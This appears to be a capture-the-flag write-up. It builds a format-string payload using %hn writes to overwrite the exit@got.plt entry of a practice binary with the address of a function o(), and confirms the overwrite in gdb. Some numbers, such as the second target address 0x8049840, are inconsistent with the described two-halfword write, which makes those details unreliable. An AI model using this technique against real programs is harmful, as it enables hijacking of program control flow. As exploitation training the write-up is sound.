### How to find the payload

For this one we are directly going to do the optimized way using %hn instead of %n and write a word (4 bytes) on the 2 part of the address of the GOT this time which is 0x80484a4. So we need to write those 4 bytes in two addresses in little endian:
- 0x8049838 = \x38\x98\x04\x08
- 0x8049840 = \x40\x98\x04\x08

Then we need the value we want to inject into this address, which is the address of o() so 0x80484a4. We divide it into two parts and we check its decimal value:
- 0804 - high order bytes - 2052  in decimal
- 84a4 - low order bytes  - 33956 in decimal

The lowest decimal score is the high order so we are going to start with the high order, and move the stack pointer to be at the beginning of the buffer, which is 3 positions away and calculate the size of the first buffer size which is 2052 - 8 (addresses) - 11 (%x * 2) = 2033:

```py
'\x40\x98\x04\x08' + '\x38\x98\x04\x08' + '%x' * 2 + '%2033x' + '%hn' + '%hn'
```

We can verify if it works well so far:


```sh
(gdb) x 0x8049838
0x8049838 <exit@got.plt>:	0x08040804
```

The value is correct, let's work on the low order bytes now. So it is 33956 - 2052 = 31904. We don't forget to add the AAAA, and to remove 4 from the high order bytes buffer:

```py
'\x40\x98\x04\x08' + 'AAAA' + '\x38\x98\x04\x08' + '%x' * 2 + '%2029x' + '%hn' + '%31904x' + '%hn'
```

We can now check if the variable in 0x8049838 is 0x80484a4 and if we managed to modify the GOT:

```sh
(gdb) x 0x8049838
0x8049838 <exit@got.plt>:	0x080484a4
```

And here we are !